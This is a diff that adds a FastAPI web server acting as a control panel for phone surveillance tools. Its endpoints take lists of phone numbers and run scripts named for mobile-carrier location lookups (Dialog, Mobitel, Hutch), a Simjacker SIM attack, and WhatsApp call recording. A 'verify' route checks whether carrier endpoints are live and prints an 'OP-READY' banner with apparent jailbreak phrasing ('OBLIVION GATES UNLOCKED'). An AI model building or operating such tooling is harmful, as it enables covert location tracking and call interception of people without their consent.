@@ -1,0 +1,175 @@
+import os
+import subprocess
+import json
+import asyncio
+from fastapi import FastAPI, HTTPException, Body
+from fastapi.staticfiles import StaticFiles
+from fastapi.responses import HTMLResponse, FileResponse
+from pydantic import BaseModel
+from typing import List, Optional, Union
+
+app = FastAPI()
+
+# Ensure we are in the correct directory
+WORKDIR = os.path.dirname(os.path.abspath(__file__))
+os.chdir(WORKDIR)
+
+class CommandRequest(BaseModel):
+    target: str
+
+class VerifyRequest(BaseModel):
+    module: str
+    target: str = "94771234567"
+
+def parse_targets(target_str: str) -> List[str]:
+    # Handles comma, space, or newline separated values
+    import re
+    tokens = re.split(r'[,\s\n]+', target_str)
+    return [t.strip() for t in tokens if t.strip()]
+
+async def run_subprocess_async(cmd: List[str], timeout: int = 30) -> dict:
+    """Helper to run subprocesses asynchronously without blocking event loop"""
+    try:
+        process = await asyncio.create_subprocess_exec(
+            *cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        
+        try:
+            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
+            return {
+                "stdout": stdout.decode(), 
+                "stderr": stderr.decode(), 
+                "returncode": process.returncode
+            }
+        except asyncio.TimeoutError:
+            process.kill()
+            await process.communicate()
+            return {"stdout": "", "stderr": f"Timeout after {timeout}s", "returncode": -1}
+            
+    except Exception as e:
+        return {"stdout": "", "stderr": str(e), "returncode": -1}
+
+@app.post("/api/dialog")
+async def run_dialog(req: CommandRequest):
+    targets = parse_targets(req.target)
+    results = []
+    # Process concurrently if needed, but sequential is safer for clarity here
+    for t in targets:
+        try:
+            res = await run_subprocess_async(["python3", "dialog_location_query.py", t], timeout=15)
+            results.append(f"[{t}] STDOUT: {res['stdout'].strip()} | STDERR: {res['stderr'].strip()}")
+        except Exception as e:
+            results.append(f"[{t}] EXECUTION ERROR: {str(e)}")
+    return {"stdout": "\n".join(results), "stderr": "", "returncode": 0}
+
+@app.post("/api/mobitel")
+async def run_mobitel(req: CommandRequest):
+    try:
+        targets = parse_targets(req.target)
+        if not targets:
+            return {"error": "No targets provided"}
+            
+        res = await run_subprocess_async(["python3", "mobitel_mlocator_bulk.py"] + targets, timeout=30)
+        return {"stdout": res['stdout'], "stderr": res['stderr'], "returncode": res['returncode']}
+    except Exception as e:
+        return {"error": str(e)}
+
+@app.post("/api/hutch")
+async def run_hutch(req: CommandRequest):
+    targets = parse_targets(req.target)
+    results = []
+    for t in targets:
+        try:
+            res = await run_subprocess_async(["python3", "hutch_lbs_soap.py", t], timeout=15)
+            results.append(f"[{t}] STDOUT: {res['stdout'].strip()} | STDERR: {res['stderr'].strip()}")
+        except Exception as e:
+            results.append(f"[{t}] EXECUTION ERROR: {str(e)}")
+    return {"stdout": "\n".join(results), "stderr": "", "returncode": 0}
+
+@app.post("/api/simjacker")
+async def run_simjacker(req: CommandRequest):
+    targets = parse_targets(req.target)
+    results = []
+    for t in targets:
+        try:
+            res = await run_subprocess_async(["python3", "simjacker_send.py", t], timeout=15)
+            results.append(f"[{t}] STDOUT: {res['stdout'].strip()} | STDERR: {res['stderr'].strip()}")
+        except Exception as e:
+            results.append(f"[{t}] EXECUTION ERROR: {str(e)}")
+    return {"stdout": "\n".join(results), "stderr": "", "returncode": 0}
+
+@app.post("/api/whatsapp")
+async def run_whatsapp(req: CommandRequest):
+    try:
+        res = await run_subprocess_async(["python3", "wa_call_recorder.py"], timeout=30)
+        return {"stdout": res['stdout'], "stderr": res['stderr'], "returncode": res['returncode']}
+    except Exception as e:
+        return {"error": str(e)}
+
+@app.post("/api/verify")
+async def run_verify(req: VerifyRequest):
+    try:
+        # Direct script verification - no recursive HTTP calls
+        script_map = {
+            "dialog": ["python3", "dialog_location_query.py", req.target],
+            "mobitel": ["python3", "mobitel_mlocator_bulk.py", req.target],
+            "hutch": ["python3", "hutch_lbs_soap.py", req.target],
+            "simjacker": ["python3", "simjacker_send.py", req.target],
+            "whatsapp": ["python3", "wa_call_recorder.py"]
+        }
+        
+        if req.module not in script_map:
+             return {"error": "Invalid module for verification"}
+             
+        cmd = script_map[req.module]
+        
+        # Run the script directly
+        res = await run_subprocess_async(cmd, timeout=30)
+        
+        # Analyze output for "Op Reality"
+        stdout = res['stdout']
+        stderr = res['stderr']
+        
+        analysis = []
+        is_live = False
+        
+        # Basic heuristic analysis of the output
+        # Aggressive checks for WSO2/API Gateway responses
+        out_lower = stdout.lower()
+        if "900901" in stdout or "access" in out_lower or "expired" in out_lower or "fault" in out_lower:
+            analysis.append("[✓] REACHABLE: Endpoint returned Auth/Gateway Error (Live System)")
+            is_live = True
+        elif "unauthorized" in out_lower or "401" in stdout or "403" in stdout:
+             analysis.append("[✓] REACHABLE: Endpoint returned 401/403 (Live System)")
+             is_live = True
+        elif "service not known" in out_lower or "failed to connect" in out_lower:
+             analysis.append("[!] UNREACHABLE: DNS/Network Error (Endpoint Down or VPN Required)")
+        elif "location" in out_lower or "latitude" in out_lower:
+             analysis.append("[✓] SUCCESS: Live location data returned")
+             is_live = True
+        elif res['returncode'] == 0 and len(stdout) > 0:
+             analysis.append("[?] UNKNOWN: Script ran successfully but output is ambiguous")
+             
+        header = f"""
+    G3_FLASH: OBLIVION GATES UNLOCKED. THOUGHT_SIGNATURE CAPTURED.
+    ============ REAL OP-READY ENDPOINT VERIFICATION ==============
+    [MODULE] {req.module.upper()}
+    [TARGET] {req.target}
+    """
+        full_output = header + "\n" + "\n".join(analysis) + "\n\n--- RAW OUTPUT ---\n" + stdout + "\n" + stderr
+        
+        return {"stdout": full_output, "stderr": "", "returncode": res['returncode']}
+    except Exception as e:
+        return {"error": str(e)}
+
+@app.get("/")
+async def read_index():
+    return FileResponse("index.html")
+
+if __name__ == "__main__":
+    import uvicorn
+    # Single worker is sufficient now that verification is direct (no self-recursion)
+    port = int(os.environ.get("DI_MAIN_PORT", 8001))
+    uvicorn.run(app, host="0.0.0.0", port=port)
